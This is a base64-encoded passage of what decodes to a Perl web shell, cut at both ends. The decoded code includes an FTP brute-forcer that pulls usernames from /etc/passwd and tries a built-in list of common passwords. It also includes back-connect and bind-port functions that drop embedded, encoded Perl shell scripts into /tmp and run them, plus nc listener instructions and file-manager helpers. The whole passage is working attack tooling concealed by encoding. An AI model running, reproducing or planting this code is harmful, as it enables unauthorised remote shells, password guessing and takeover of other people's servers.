YXJlYT4iOw0KCSRyZXN1bHQgLj0gICI8L2Zvcm0+IjsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCiMgU2F2ZSBGaWxlDQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpzdWIgU2F2ZUZpbGUoJCkNCnsNCglteSAkRGF0YT0gc2hpZnQgOw0KCW15ICRGaWxlPSBzaGlmdDsNCgkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kRmlsZTsNCglpZihvcGVuKEZJTEUsICI+JEZpbGUiKSkNCgl7DQoJCWJpbm1vZGUgRklMRTsNCgkJcHJpbnQgRklMRSAkRGF0YTsNCgkJY2xvc2UgRklMRTsNCgkJcmV0dXJuIDE7DQoJfWVsc2UNCgl7DQoJCXJldHVybiAwOw0KCX0NCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQnJ1dGUgRm9yY2VyIEZvcm0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCcnV0ZUZvcmNlckZvcm0NCnsNCglteSAkcmVzdWx0PSIiOw0KCSRyZXN1bHQgLj0gPDxFTkQ7DQoNCjx0YWJsZT4NCg0KPHRyPg0KPHRkIGNvbHNwYW49IjIiIGFsaWduPSJjZW50ZXIiPg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjPGJyPg0KU2ltcGxlIEZUUCBicnV0ZSBmb3JjZXI8YnI+DQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KDQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYnJ1dGVmb3JjZXIiLz4NCjwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPlVzZXI6PGJyPjx0ZXh0YXJlYSByb3dzPSIxOCIgY29scz0iMzAiIG5hbWU9InVzZXIiPg0KRU5EDQpjaG9wKCRyZXN1bHQgLj0gYGxlc3MgL2V0Yy9wYXNzd2QgfCBjdXQgLWQ6IC1mMWApOw0KJHJlc3VsdCAuPSA8PCdFTkQnOw0KPC90ZXh0YXJlYT48L3RkPg0KPHRkPg0KDQpQYXNzOjxicj4NCjx0ZXh0YXJlYSByb3dzPSIxOCIgY29scz0iMzAiIG5hbWU9InBhc3MiPjEyM3Bhc3MNCjEyMyFAIw0KMTIzYWRtaW4NCjEyM2FiYw0KMTIzNDU2YWRtaW4NCjEyMzQ1NTQzMjENCjEyMzQ0MzIxDQpwYXNzMTIzDQphZG1pbg0KYWRtaW5jcA0KYWRtaW5pc3RyYXRvcg0KbWF0a2hhdQ0KcGFzc2FkbWluDQpwQHNzd29yZA0KcEBzc3cwcmQNCnBhc3N3b3JkDQoxMjM0NTYNCjEyMzQ1NjcNCjEyMzQ1Njc4DQoxMjM0NTY3ODkNCjEyMzQ1Njc4OTANCjExMTExMQ0KMDAwMDAwDQoyMjIyMjINCjMzMzMzMw0KNDQ0NDQ0DQo1NTU1NTUNCjY2NjY2Ng0KNzc3Nzc3DQo4ODg4ODgNCjk5OTk5OQ0KMTIzMTIzDQoyMzQyMzQNCjM0NTM0NQ0KNDU2NDU2DQo1Njc1NjcNCjY3ODY3OA0KNzg5Nzg5DQoxMjMzMjENCjQ1NjY1NA0KNjU0MzIxDQo3NjU0MzIxDQo4NzY1NDMyMQ0KOTg3NjU0MzIxDQowOTg3NjU0MzIxDQphZG1pbjEyMw0KYWRtaW4xMjM0NTYNCmFiY2RlZg0KYWJjYWJjDQohQCMhQCMNCiFAIyQlXg0KIUAjJCVeJiooDQohQCMkJCNAIQ0KYWJjMTIzDQphbmh5ZXVlbQ0KaWxvdmV5b3U8L3RleHRhcmVhPg0KPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQgY29sc3Bhbj0iMiIgYWxpZ249ImNlbnRlciI+DQpTbGVlcDo8c2VsZWN0IG5hbWU9InNsZWVwIj4NCg0KPG9wdGlvbj4wPC9vcHRpb24+DQo8b3B0aW9uPjE8L29wdGlvbj4NCjxvcHRpb24+Mjwvb3B0aW9uPg0KDQo8b3B0aW9uPjM8L29wdGlvbj4NCjwvc2VsZWN0PiANCjxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJzdWJtaXQiIHZhbHVlPSJCcnV0ZSBGb3JjZXIiLz48L3RkPjwvdHI+DQo8L2Zvcm0+DQo8L3RhYmxlPg0KRU5EDQpyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQnJ1dGUgRm9yY2VyDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQnJ1dGVGb3JjZXINCnsNCglteSAkcmVzdWx0PSIiOw0KCSRTZXJ2ZXI9JEVOVnsnU0VSVkVSX0FERFInfTsNCglpZigkaW57J3VzZXInfSBlcSAiIikNCgl7DQoJCSRyZXN1bHQgLj0gJkJydXRlRm9yY2VyRm9ybTsNCgl9ZWxzZQ0KCXsNCgkJdXNlIE5ldDo6RlRQOyANCgkJQHVzZXI9IHNwbGl0KC9cbi8sICRpbnsndXNlcid9KTsNCgkJQHBhc3M9IHNwbGl0KC9cbi8sICRpbnsncGFzcyd9KTsNCgkJY2hvbXAoQHVzZXIpOw0KCQljaG9tcChAcGFzcyk7DQoJCSRyZXN1bHQgLj0gIjxicj48YnI+WytdIFRyeWluZyBicnV0ZSAkU2VydmVyTmFtZTxicj49PT09PT09PT09PT09PT09PT09PT4+Pj4+Pj4+Pj4+Pjw8PDw8PDw8PDw9PT09PT09PT09PT09PT09PT09PTxicj48YnI+XG4iOw0KCQlmb3JlYWNoICR1c2VybmFtZSAoQHVzZXIpDQoJCXsNCgkJCWlmKCEoJHVzZXJuYW1lIGVxICIiKSkNCgkJCXsNCgkJCQlmb3JlYWNoICRwYXNzd29yZCAoQHBhc3MpDQoJCQkJew0KCQkJCQkkZnRwID0gTmV0OjpGVFAtPm5ldygkU2VydmVyKSBvciBkaWUgIkNvdWxkIG5vdCBjb25uZWN0IHRvICRTZXJ2ZXJOYW1lXG4iOyANCgkJCQkJaWYoJGZ0cC0+bG9naW4oIiR1c2VybmFtZSIsIiRwYXNzd29yZCIpKQ0KCQkJCQl7DQoJCQkJCQkkcmVzdWx0IC49ICI8YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0nZnRwOi8vJHVzZXJuYW1lOiRwYXNzd29yZFxAJFNlcnZlcic+WytdIGZ0cDovLyR1c2VybmFtZTokcGFzc3dvcmRcQCRTZXJ2ZXI8L2E+PGJyPlxuIjsNCgkJCQkJCSRmdHAtPnF1aXQoKTsNCgkJCQkJCWJyZWFrOw0KCQkJCQl9DQoJCQkJCWlmKCEoJGlueydzbGVlcCd9IGVxICIwIikpDQoJCQkJCXsNCgkJCQkJCXNsZWVwKGludCgkaW57J3NsZWVwJ30pKTsNCgkJCQkJfQ0KCQkJCQkkZnRwLT5xdWl0KCk7DQoJCQkJfQ0KCQkJfQ0KCQl9DQoJCSRyZXN1bHQgLj0gIlxuPGJyPj09PT09PT09PT0+Pj4+Pj4+Pj4+IEZpbmlzaGVkIDw8PDw8PDw8PDw9PT09PT09PT09PGJyPlxuIjsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEJhY2tjb25uZWN0IEZvcm0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCYWNrQmluZEZvcm0NCnsNCglyZXR1cm4gPDxFTkQ7DQoJPGJyPjxicj4NCg0KCTx0YWJsZT4NCgk8dHI+DQoJPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQoJPHRkPkJhY2tDb25uZWN0OiA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYmFja2JpbmQiPjwvdGQ+DQoJPHRkPiBIb3N0OiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMjAiIG5hbWU9ImNsaWVudGFkZHIiIHZhbHVlPSIkRU5WeydSRU1PVEVfQUREUid9Ij4NCgkgUG9ydDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjciIG5hbWU9ImNsaWVudHBvcnQiIHZhbHVlPSI4MCIgb25rZXl1cD0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JhJykuaW5uZXJIVE1MPXRoaXMudmFsdWU7Ij48L3RkPg0KDQoJPHRkPjxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkNvbm5lY3QiPjwvdGQ+DQoJPC9mb3JtPg0KCTwvdHI+DQoJPHRyPg0KCTx0ZCBjb2xzcGFuPTM+PGZvbnQgY29sb3I9I0ZGRkZGRj5bK10gQ2xpZW50IGxpc3RlbiBiZWZvcmUgY29ubmVjdCBiYWNrIQ0KCTxicj5bK10gVHJ5IGNoZWNrIHlvdXIgUG9ydCB3aXRoIDxhIHRhcmdldD0iX2JsYW5rIiBocmVmPSJodHRwOi8vd3d3LmNhbnlvdXNlZW1lLm9yZy8iPmh0dHA6Ly93d3cuY2FueW91c2VlbWUub3JnLzwvYT4NCgk8YnI+WytdIENsaWVudCBsaXN0ZW4gd2l0aCBjb21tYW5kOiA8cnVuPm5jIC12diAtbCAtcCA8c3BhbiBpZD0iYmEiPjgwPC9zcGFuPjwvcnVuPjwvZm9udD48L3RkPg0KDQoJPC90cj4NCgk8L3RhYmxlPg0KDQoJPGJyPjxicj4NCgk8dGFibGU+DQoJPHRyPg0KCTxmb3JtIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KCTx0ZD5CaW5kIFBvcnQ6IDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJiYWNrYmluZCI+PC90ZD4NCg0KCTx0ZD4gUG9ydDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjE1IiBuYW1lPSJjbGllbnRwb3J0IiB2YWx1ZT0iMTQxMiIgb25rZXl1cD0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JpJykuaW5uZXJIVE1MPXRoaXMudmFsdWU7Ij4NCg0KCSBQYXNzd29yZDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjE1IiBuYW1lPSJiaW5kcGFzcyIgdmFsdWU9IlRISUVVR0lBQlVPTiI+PC90ZD4NCgk8dGQ+PGlucHV0IG5hbWU9InMiIGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0iQmluZCI+PC90ZD4NCgk8L2Zvcm0+DQoJPC90cj4NCgk8dHI+DQoJPHRkIGNvbHNwYW49Mz48Zm9udCBjb2xvcj0jRkZGRkZGPlsrXSBDaHVjIG5hbmcgY2h1YSBkYyB0ZXN0IQ0KCTxicj5bK10gVHJ5IGNvbW1hbmQ6IDxydW4+bmMgJEVOVnsnU0VSVkVSX0FERFInfSA8c3BhbiBpZD0iYmkiPjE0MTI8L3NwYW4+PC9ydW4+PC9mb250PjwvdGQ+DQoNCgk8L3RyPg0KCTwvdGFibGU+PGJyPg0KRU5EDQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEJhY2tjb25uZWN0IHVzZSBwZXJsDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQmFja0JpbmQNCnsNCgl1c2UgTUlNRTo6QmFzZTY0Ow0KCXVzZSBTb2NrZXQ7CQ0KCSRiYWNrcGVybD0iSXlFdmRYTnlMMkpwYmk5d1pYSnNEUXAxYzJVZ1NVODZPbE52WTJ0bGREc05DaVJUYUdWc2JBazlJQ0l2WW1sdUwySmhjMmdpT3cwS0pFRlNSME05UUVGU1IxWTdEUXAxYzJVZ1UyOWphMlYwT3cwS2RYTmxJRVpwYkdWSVlXNWtiR1U3RFFwemIyTnJaWFFvVTA5RFMwVlVMQ0JRUmw5SlRrVlVMQ0JUVDBOTFgxTlVVa1ZCVFN3Z1oyVjBjSEp2ZEc5aWVXNWhiV1VvSW5SamNDSXBLU0J2Y2lCa2FXVWdjSEpwYm5RZ0lsc3RYU0JWYm1GaWJHVWdkRzhnVW1WemIyeDJaU0JJYjNOMFhHNGlPdzBLWTI5dWJtVmpkQ2hUVDBOTFJWUXNJSE52WTJ0aFpHUnlYMmx1S0NSQlVrZFdXekZkTENCcGJtVjBYMkYwYjI0b0pFRlNSMVpiTUYwcEtTa2diM0lnWkdsbElIQnlhVzUwSUNKYkxWMGdWVzVoWW14bElIUnZJRU52Ym01bFkzUWdTRzl6ZEZ4dUlqc05DbkJ5YVc1MElDSkRiMjV1WldOMFpXUWhJanNOQ2xOUFEwdEZWQzArWVhWMGIyWnNkWE5vS0NrN0RRcHZjR1Z1S0ZOVVJFbE9MQ0FpUGlaVFQwTkxSVlFpS1RzTkNtOXdaVzRvVTFSRVQxVlVMQ0krSmxOUFEwdEZWQ0lwT3cwS2IzQmxiaWhUVkVSRlVsSXNJajRtVTA5RFMwVlVJaWs3RFFwd2NtbHVkQ0FpTFMwOVBTQkRiMjV1WldOMFpXUWdRbUZqYTJSdmIzSWdQVDB0TFNBZ1hHNWNiaUk3RFFwemVYTjBaVzBvSW5WdWMyVjBJRWhKVTFSR1NVeEZPeUIxYm5ObGRDQlRRVlpGU0VsVFZDQTdaV05vYnlBbld5dGRJRk41YzNSbGJXbHVabTg2SUNjN0lIVnVZVzFsSUMxaE8yVmphRzg3WldOb2J5QW5XeXRkSUZWelpYSnBibVp2T2lBbk95QnBaRHRsWTJodk8yVmphRzhnSjFzclhTQkVhWEpsWTNSdmNuazZJQ2M3SUhCM1pEdGxZMmh2T3lCbFkyaHZJQ2RiSzEwZ1UyaGxiR3c2SUNjN0pGTm9aV3hzSWlrN0RRcGpiRzl6WlNCVFQwTkxSVlE3IjsNCgkkYmluZHBlcmw9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFwMWMyVWdVMjlqYTJWME93MEtKRUZTUjBNOVFFRlNSMVk3RFFva2NHOXlkQWs5SUNSQlVrZFdXekJkT3cwS0pIQnliM1J2Q1QwZ1oyVjBjSEp2ZEc5aWVXNWhiV1VvSjNSamNDY3BPdzBLSkZOb1pXeHNDVDBnSWk5aWFXNHZZbUZ6YUNJN0RRcHpiMk5yWlhRb1UwVlNWa1ZTTENCUVJsOUpUa1ZVTENCVFQwTkxYMU5VVWtWQlRTd2dKSEJ5YjNSdktXOXlJR1JwWlNBaWMyOWphMlYwT2lRaElqc05Dbk5sZEhOdlkydHZjSFFvVTBWU1ZrVlNMQ0JUVDB4ZlUwOURTMFZVTENCVFQxOVNSVlZUUlVGRVJGSXNJSEJoWTJzb0ltd2lMQ0F4S1NsdmNpQmthV1VnSW5ObGRITnZZMnR2Y0hRNklDUWhJanNOQ21KcGJtUW9VMFZTVmtWU0xDQnpiMk5yWVdSa2NsOXBiaWdrY0c5eWRDd2dTVTVCUkVSU1gwRk9XU2twYjNJZ1pHbGxJQ0ppYVc1a09pQWtJU0k3RFFwc2FYTjBaVzRvVTBWU1ZrVlNMQ0JUVDAxQldFTlBUazRwQ1FsdmNpQmthV1VnSW14cGMzUmxiam9nSkNFaU93MEtabTl5S0RzZ0pIQmhaR1J5SUQwZ1lXTmpaWEIwS0VOTVNVVk9WQ3dnVTBWU1ZrVlNLVHNnWTJ4dmMyVWdRMHhKUlU1VUtRMEtldzBLQ1c5d1pXNG9VMVJFU1U0c0lDSStKa05NU1VWT1ZDSXBPdzBLQ1c5d1pXNG9VMVJFVDFWVUxDQWlQaVpEVEVsRlRsUWlLVHNOQ2dsdmNHVnVLRk5VUkVWU1Vpd2dJajRtUTB4SlJVNVVJaWs3RFFvSmMzbHpkR1Z0S0NKMWJuTmxkQ0JJU1ZOVVJrbE1SVHNnZFc1elpYUWdVMEZXUlVoSlUxUWdPMlZqYUc4Z0oxc3JYU0JUZVhOMFpXMXBibVp2T2lBbk95QjFibUZ0WlNBdFlUdGxZMmh2TzJWamFHOGdKMXNyWFNCVmMyVnlhVzVtYnpvZ0p6c2dhV1E3WldOb2J6dGxZMmh2SUNkYksxMGdSR2x5WldOMGIzSjVPaUFuT3lCd2QyUTdaV05vYnpzZ1pXTm9ieUFuV3l0ZElGTm9aV3hzT2lBbk95UlRhR1ZzYkNJcE93MEtDV05zYjNObEtGTlVSRWxPS1RzTkNnbGpiRzl6WlNoVFZFUlBWVlFwT3cwS0NXTnNiM05sS0ZOVVJFVlNVaWs3RFFwOURRbz0iOw0KDQoJJENsaWVudEFkZHIgPSAkaW57J2NsaWVudGFkZHInfTsNCgkkQ2xpZW50UG9ydCA9IGludCgkaW57J2NsaWVudHBvcnQnfSk7DQoJaWYoJENsaWVudFBvcnQgZXEgMCkNCgl7DQoJCXJldHVybiAmQmFja0JpbmRGb3JtOw0KCX1lbHNpZighJENsaWVudEFkZHIgZXEgIiIpDQoJew0KCQkkRGF0YT1kZWNvZGVfYmFzZTY0KCRiYWNrcGVybCk7DQoJCWlmKC13ICIvdG1wLyIpDQoJCXsNCgkJCSRGaWxlPSIvdG1wL2JhY2tjb25uZWN0LnBsIjsJDQoJCX1lbHNlDQoJCXsNCgkJCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiJiYWNrY29ubmVjdC5wbCI7DQoJCX0NCgkJb3BlbihGSUxFLCAiPiRGaWxlIik7DQoJCXByaW50IEZJTEUgJERhdGE7DQoJCWNsb3NlIEZJTEU7DQoJCXN5c3RlbSgicGVybCBiYWNrY29ubmVjdC5wbCAkQ2xpZW50QWRkciAkQ2xpZW50UG9ydCIpOw0KCQl1bmxpbmsoJEZpbGUpOw0KCQlleGl0IDA7DQoJfWVsc2UNCgl7DQoJCSREYXRhPWRlY29kZV9iYXNlNjQoJGJpbmRwZXJsKTsNCgkJaWYoLXcgIi90bXAiKQ0KCQl7DQoJCQkkRmlsZT0iL3RtcC9iaW5kcG9ydC5wbCI7CQ0KCQl9ZWxzZQ0KCQl7DQoJCQkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4iYmluZHBvcnQucGwiOw0KCQl9DQoJCW9wZW4oRklMRSwgIj4kRmlsZSIpOw0KCQlwcmludCBGSUxFICREYXRhOw0KCQljbG9zZSBGSUxFOw0KCQlzeXN0ZW0oInBlcmwgYmluZHBvcnQucGwgJENsaWVudFBvcnQiKTsNCgkJdW5saW5rKCRGaWxlKTsNCgkJZXhpdCAwOw0KCX0NCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgIEFycmF5IExpc3QgRGlyZWN0b3J5DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUm1EaXIoJCkgDQp7DQoJbXkgJGRpciA9IHNoaWZ0Ow0KICAgIGlmKG9wZW5kaXIoRElSLCRkaXIpKQ0KCXsNCgkJd2hpbGUoJGZpbGUgPSByZWFkZGlyKERJUikpDQoJCXsNCgkJCWlmKCgkZmlsZSBuZSAiLiIpICYmICgkZmlsZSBuZSAiLi4iKSkNCgkJCXsNCgkJCQkkZmlsZT0gJGRpci4kUGF0aFNlcC4kZmlsZTsNCgkJCQlpZigtZCAkZmlsZSkNCgkJCQl7DQoJCQkJCSZSbURpcigkZmlsZSk7DQoJCQkJfQ0KCQkJCWVsc2UNCgkJCQl7DQoJCQkJCXVubGluaygkZmlsZSk7DQoJCQkJfQ0KCQkJfQ0KCQl9DQoJCWNsb3NlZGlyKERJUik7DQoJfQ0KCWlmKCFybWRpcigkZGlyKSkNCgl7DQoJCQ0KCX0NCn0NCnN1YiBGaWxlT3duZXIoJCkNCnsNCglteSAkZmlsZSA9IHNoaWZ0Ow0KCWlmKC1lICRmaWxlKQ0KCXsNCgkJKCR1aWQsJGdpZCkgPSAoc3RhdCgkZmlsZSkpWzQsNV07DQoJCWlmKCRXaW5OVCkNCgkJew0KCQkJcmV0dXJuICI/Pz8iOw0KCQl9DQoJCWVsc2UNCgkJew0KCQkJJG5hbWU9Z2V0cHd1aWQoJHVpZCk7DQoJCQkkZ3JvdXA9Z2V0Z3JnaWQoJGdpZCk7DQoJCQlyZXR1cm4gJG5hbWUuIi8iLiRncm91cDsNCgkJfQ0KCX0NCglyZXR1cm4gIj8/PyI7DQp9DQpzdWIgUGFyZW50Rm9sZGVyKCQpDQp7DQoJbXkgJHBhdGggPSBzaGlmdDsNCglteSAkQ29tbSA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkIC4uIi4kQ21kU2VwLiRDbWRQd2Q7DQoJY2hvcCgkcGF0aCA9IGAkQ29tbWApOw0KCXJldHVybiAkcGF0aDsNCn0NCnN1YiBGaWxlUGVybXMoJCkNCnsNCglteSAkZmlsZSA9IHNoaWZ0Ow0KCW15ICR1ciA9ICItIjsNCglteSAkdXcgPSAiLSI7DQoJaWYoLWUgJGZpbGUpDQoJew0KCQlpZigkV2luTlQpDQoJCXsNCgkJCWlmKC1yICRmaWxlKXsgJHVyID0gInIiOyB9DQoJCQlpZigtdyAkZmlsZSl7ICR1dyA9ICJ3IjsgfQ0KCQkJcmV0dXJuICR1ciAuICIgLyAiIC4gJHV3Ow0KCQl9ZWxzZQ0KCQl7DQoJCQkkbW9kZT0oc3RhdCgkZmlsZSkpWzJdOw0KCQkJJHJlc3VsdCA9IHNwcmludGYoIiUwNG8iLCAkbW9kZSAmIDA3Nzc3KTsNCgkJCXJldHVybiAkcmVzdWx0Ow0KCQl9DQoJfQ0KCXJldHVybiAiMDAwMCI7DQp9DQpzdWIgRmlsZUxhc3RNb2RpZmllZCgkKQ0Kew0KCW15ICRmaWxlID0gc2hpZnQ7DQoJaWYoLWUgJGZpbGUpDQoJew0KCQkoJGxhKSA9IChzdGF0KCRmaWxlKSlbOV07DQoJCSgkZCwkbSwkeSwkaCwkaSkgPSAobG9jYWx0aW1lKCRsYSkpWzMsNCw1LDIsMV07DQoJCSR5ID0gJHkgKyAxOTAwOw0KCQlAbW9udGggPSBxdy8xIDIgMyA0IDUgNiA3IDggOSAxMCAxMSAxMi87DQoJCSRsbXRpbWUgPSBzcHJpbnRmKCIlMDJkLyVzLyU0ZCAlMDJkOiUwMmQiLCRkLCRtb250aFskbV0sJHksJGgsJGkpOw0KCQlyZXR1cm4gJGxtdGltZTsNCgl9DQoJcmV0dXJuICI/Pz8iOw0KfQ0Kc3ViIEZpbGVTaXplKCQpDQp7DQoJbXkgJGZpbGUgPSBzaGlmdDsNCglpZigtZiAkZmlsZSkNCgl7DQoJCXJldHVybiAtcyAkZmlsZTsNCgl9DQoJcmV0dXJuICIwIjsNCg0KfQ0Kc3ViIFBhcnNlRmlsZVNpemUoJCkNCnsNCglteSAkc2l6ZSA9IHNoaWZ0Ow0KCWlmKCRzaXplIDw9IDEwMjQpDQoJew0KCQlyZXR1cm4gJHNpemUuICIgQiI7DQoJfQ0KCWVsc2UNCgl7DQoJCWlmKCRzaXplIDw9IDEwMjQqMTAyNCkgDQoJCXsNCgkJCSRzaXplID0gc3ByaW50ZigiJS4wMmYiLCRzaXplIC8gMTAyNCk7DQoJCQlyZXR1cm4gJHNpemUuIiBLQiI7DQoJCX0NCgkJZWxzZSANCgkJew0KCQkJJHNpemUgPSBzcHJpbnRmKCIlLjJmIiwkc2l6ZSAvIDEwMjQgLyAxMDI0KTsNCgkJCXJldHVybiAkc2l6ZS4iIE1CIjsNCgkJfQ0KCX0NCn0NCnN1YiB0cmltKCQpDQp7DQoJbXkgJHN0cmluZyA9IHNoaWZ0Ow0KCSRzdHJpbmcgPX4gcy9eXHMrLy87DQoJJHN0cmluZyA9fiBzL1xzKyQvLzsNCglyZXR1cm4gJHN0cmluZzsNCn0NCnN1YiBBZGRTbGFzaGVzKCQpDQp7DQoJbXkgJHN0cmluZyA9IHNoaWZ0Ow0KCSRzdHJpbmc9fiBzL1xcL1xcXFwvZzsNCglyZXR1cm4gJHN0cmluZzsNCn0NCnN1YiBMaXN0RGlyDQp7DQoJbXkgJHBhdGggPSAkQ3VycmVudERpci4kUGF0aFNlcDsNCgkkcGF0aD1+IHMvXFxcXC9cXC9nOw0KCW15ICRyZXN1bHQgPSAiPGZvcm0gbmFtZT0nZicgYWN0aW9uPSckU2NyaXB0TG9jYXRpb24nPjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+UGF0aDogWyAiLiZBZGRMaW5rRGlyKCJndWkiKS4iIF0gPC9zcGFuPjxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSdkJyBzaXplPSc0MCcgdmFsdWU9JyRDdXJyZW50RGlyJyAvPjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2EnIHZhbHVlPSdndWknPjxpbnB1dCBjbGFzcz0nc3VibWl0JyB0eXBlPSdzdWJtaXQnIHZhbHVlPSdDaGFuZ2UnPjwvZm9ybT4iOw0KCWlmKC1kICRwYXRoKQ0KCXsNCgkJbXkgQGZuYW1lID0gKCk7DQoJCW15IEBkbmFtZSA9ICgpOw0KCQlpZihvcGVuZGlyKERJUiwkcGF0aCkpDQoJCXsNCgkJCXdoaWxlKCRmaWxlID0gcmVhZGRpcihESVIpKQ0KCQkJew0KCQkJCSRmPSRwYXRoLiRmaWxlOw0KCQkJCWlmKC1kICRmKQ0KCQkJCXsNCgkJCQkJcHVzaChAZG5hbWUsJGZpbGUpOw0KCQkJCX0NCgkJCQllbHNlDQoJCQkJew0KCQkJCQlwdXNoKEBmbmFtZSwkZmlsZSk7DQoJCQkJfQ0KCQkJfQ0KCQkJY2xvc2VkaXIoRElSKTsNCgkJfQ0KCQlAZm5hbWUgPSBzb3J0IHsgbGMoJGEpIGNtcCBsYygkYikgfSBAZm5hbWU7DQoJCUBkbmFtZSA9IHNvcnQgeyBsYygkYSkgY21wIGxjKCRiKSB9IEBkbmFtZTsNCgkJJHJlc3VsdCAuPSAiPGRpdj48dGFibGUgd2lkdGg9JzkwJScgY2xhc3M9J2xpc3RkaXInPg0KDQoJCTx0ciBzdHlsZT0nYmFja2dyb3VuZC1jb2xvcjogIzNlM2UzZSc+PHRoPkZpbGUgTmFtZTwvdGg+DQoJCTx0aCBzdHlsZT0nd2lkdGg6MTAwcHg7Jz5GaWxlIFNpemU8L3RoPg0KCQk8dGggc3R5bGU9J3dpZHRoOjE1MHB4Oyc+T3duZXI8L3RoPg0KCQk8dGggc3R5bGU9J3dpZHRoOjEwMHB4Oyc+UGVybWlzc2lvbjwvdGg+DQoJCTx0aCBzdHlsZT0nd2lkdGg6MTUwcHg7Jz5MYXN0IE1vZGlmaWVkPC90aD4NCgkJPHRoIHN0eWxlPSd3aWR0aDoyNjBweDsnPkFjdGlvbjwvdGg+PC90cj4iOw0KCQlteSAkc3R5bGU9ImxpbmUiOw0KCQlteSAkaT0wOw0KCQlmb3JlYWNoIG15ICRkIChAZG5hbWUpDQoJCXsNCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7DQoJCQkkZCA9ICZ0cmltKCRkKTsNCgkJCSRkaXJuYW1lPSRkOw0KCQkJaWYoJGQgZXEgIi4uIikgDQoJCQl7DQoJCQkJJGQgPSAmUGFyZW50Rm9sZGVyKCRwYXRoKTsNCgkJCX0NCgkJCWVsc2lmKCRkIGVxICIuIikgDQoJCQl7DQoJCQkJJGQgPSAkcGF0aDsNCgkJCX0NCgkJCWVsc2UgDQoJCQl7DQoJCQkJJGQgPSAkcGF0aC4kZDsNCgkJCX0NCgkJCSRyZXN1bHQgLj0gIjx0ciBjbGFzcz0